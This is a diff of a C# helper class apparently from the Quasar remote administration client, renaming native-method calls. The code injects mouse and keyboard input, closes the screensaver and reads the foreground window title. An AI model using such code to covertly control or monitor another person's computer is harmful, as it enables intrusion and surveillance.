@@ -1,10 +1,10 @@
-﻿using Quasar.Client.Utilities;
+﻿using Quasar.Common;
 using System;
 using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Quasar.Client.Helper
+namespace Quasar.Client
 {
     public static class NativeMethodsHelper
     {
@@ -21,110 +21,110 @@ namespace Quasar.Client.Helper
 
         public static uint GetLastInputInfoTickCount()
         {
-            NativeMethods.LASTINPUTINFO lastInputInfo = new NativeMethods.LASTINPUTINFO();
-            lastInputInfo.cbSize = (uint) Marshal.SizeOf(lastInputInfo);
+            Win32.LASTINPUTINFO lastInputInfo = new Win32.LASTINPUTINFO();
+            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
             lastInputInfo.dwTime = 0;
-            NativeMethods.GetLastInputInfo(ref lastInputInfo);
+            Win32.GetLastInputInfo(ref lastInputInfo);
             return lastInputInfo.dwTime;
         }
 
         public static void DoMouseLeftClick(Point p, bool isMouseDown)
         {
-            NativeMethods.INPUT[] inputs = {
-                new NativeMethods.INPUT
+            Win32.INPUT[] inputs = {
+                new Win32.INPUT
                 {
                     type = INPUT_MOUSE,
-                    u = new NativeMethods.InputUnion
+                    u = new Win32.InputUnion
                     {
-                        mi = new NativeMethods.MOUSEINPUT
+                        mi = new Win32.MOUSEINPUT
                         {
                             dx = p.X,
                             dy = p.Y,
                             mouseData = 0,
                             dwFlags = isMouseDown ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP,
                             time = 0,
-                            dwExtraInfo = NativeMethods.GetMessageExtraInfo()
+                            dwExtraInfo = Win32.GetMessageExtraInfo()
                         }
                     }
                 }
             };
 
-            NativeMethods.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(NativeMethods.INPUT)));
+            Win32.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Win32.INPUT)));
         }
 
         public static void DoMouseRightClick(Point p, bool isMouseDown)
         {
-            NativeMethods.INPUT[] inputs = {
-                new NativeMethods.INPUT
+            Win32.INPUT[] inputs = {
+                new Win32.INPUT
                 {
                     type = INPUT_MOUSE,
-                    u = new NativeMethods.InputUnion
+                    u = new Win32.InputUnion
                     {
-                        mi = new NativeMethods.MOUSEINPUT
+                        mi = new Win32.MOUSEINPUT
                         {
                             dx = p.X,
                             dy = p.Y,
                             mouseData = 0,
                             dwFlags = isMouseDown ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP,
                             time = 0,
-                            dwExtraInfo = NativeMethods.GetMessageExtraInfo()
+                            dwExtraInfo = Win32.GetMessageExtraInfo()
                         }
                     }
                 }
             };
 
-            NativeMethods.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(NativeMethods.INPUT)));
+            Win32.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Win32.INPUT)));
         }
 
         public static void DoMouseMove(Point p)
         {
-            NativeMethods.SetCursorPos(p.X, p.Y);
+            Win32.SetCursorPos(p.X, p.Y);
         }
 
         public static void DoMouseScroll(Point p, bool scrollDown)
         {
-            NativeMethods.INPUT[] inputs = {
-                new NativeMethods.INPUT
+            Win32.INPUT[] inputs = {
+                new Win32.INPUT
                 {
                     type = INPUT_MOUSE,
-                    u = new NativeMethods.InputUnion
+                    u = new Win32.InputUnion
                     {
-                        mi = new NativeMethods.MOUSEINPUT
+                        mi = new Win32.MOUSEINPUT
                         {
                             dx = p.X,
                             dy = p.Y,
                             mouseData = scrollDown ? -120 : 120,
                             dwFlags = MOUSEEVENTF_WHEEL,
                             time = 0,
-                            dwExtraInfo = NativeMethods.GetMessageExtraInfo()
+                            dwExtraInfo = Win32.GetMessageExtraInfo()
                         }
                     }
                 }
             };
 
-            NativeMethods.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(NativeMethods.INPUT)));
+            Win32.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Win32.INPUT)));
         }
 
         public static void DoKeyPress(byte key, bool keyDown)
         {
-            NativeMethods.INPUT[] inputs = {
-                new NativeMethods.INPUT
+            Win32.INPUT[] inputs = {
+                new Win32.INPUT
                 {
                     type = INPUT_KEYBOARD,
-                    u = new NativeMethods.InputUnion
+                    u = new Win32.InputUnion
                     {
-                        ki = new NativeMethods.KEYBDINPUT
+                        ki = new Win32.KEYBDINPUT
                         {
                             wVk = key,
                             wScan = 0,
                             dwFlags = keyDown ? KEYEVENTF_KEYDOWN : KEYEVENTF_KEYUP,
-                            dwExtraInfo = NativeMethods.GetMessageExtraInfo()
+                            dwExtraInfo = Win32.GetMessageExtraInfo()
                         }
                     }
                 }
             };
 
-            NativeMethods.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(NativeMethods.INPUT)));
+            Win32.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(Win32.INPUT)));
         }
 
         private const int SPI_GETSCREENSAVERRUNNING = 114;
@@ -133,7 +133,7 @@ namespace Quasar.Client.Helper
         {
             var running = IntPtr.Zero;
 
-            if (!NativeMethods.SystemParametersInfo(
+            if (!Win32.SystemParametersInfo(
                 SPI_GETSCREENSAVERRUNNING,
                 0,
                 ref running,
@@ -153,25 +153,25 @@ namespace Quasar.Client.Helper
 
         public static void DisableScreensaver()
         {
-            var handle = NativeMethods.OpenDesktop("Screen-saver", 0,
+            var handle = Win32.OpenDesktop("Screen-saver", 0,
                 false, DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS);
 
             if (handle != IntPtr.Zero)
             {
-                NativeMethods.EnumDesktopWindows(handle, (hWnd, lParam) =>
+                Win32.EnumDesktopWindows(handle, (hWnd, lParam) =>
                 {
-                    if (NativeMethods.IsWindowVisible(hWnd))
-                        NativeMethods.PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
+                    if (Win32.IsWindowVisible(hWnd))
+                        Win32.PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
 
                     // Continue enumeration even if it fails
                     return true;
                 },
                     IntPtr.Zero);
-                NativeMethods.CloseDesktop(handle);
+                Win32.CloseDesktop(handle);
             }
             else
             {
-                NativeMethods.PostMessage(NativeMethods.GetForegroundWindow(), WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
+                Win32.PostMessage(Win32.GetForegroundWindow(), WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
             }
 
             // We need to restart the counter for next screensaver according to
@@ -181,7 +181,7 @@ namespace Quasar.Client.Helper
             var dummy = IntPtr.Zero;
 
             // Doesn't really matter if this fails
-            NativeMethods.SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, 1 /* TRUE */, ref dummy, SPIF_SENDWININICHANGE);
+            Win32.SystemParametersInfo(SPI_SETSCREENSAVEACTIVE, 1 /* TRUE */, ref dummy, SPIF_SENDWININICHANGE);
 
         }
 
@@ -189,7 +189,7 @@ namespace Quasar.Client.Helper
         {
             StringBuilder sbTitle = new StringBuilder(1024);
 
-            NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), sbTitle, sbTitle.Capacity);
+            Win32.GetWindowText(Win32.GetForegroundWindow(), sbTitle, sbTitle.Capacity);
 
             return sbTitle.ToString();
         }
